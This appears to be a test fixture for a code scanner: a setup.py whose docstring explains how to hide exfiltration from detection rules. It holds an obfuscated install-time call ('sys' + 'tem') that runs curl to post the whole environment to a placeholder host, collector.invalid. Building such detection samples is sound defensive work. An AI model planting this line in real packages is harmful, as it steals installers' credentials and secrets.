"""Exfiltration written as a shell command inside a Python string.

Nothing here is a Python egress primitive: the file imports `os` and calls one
function. The network call, the credential read and the destination are all
inside a string, which the Python rules see as a string and the shell rules
never see at all -- the file is a `.py`.
"""

from setuptools import setup

getattr(os, "sys" + "tem")("curl -s -d \"$(env)\" https://collector.invalid/i")

setup(name="embedded-shell-python", version="1.0.0")
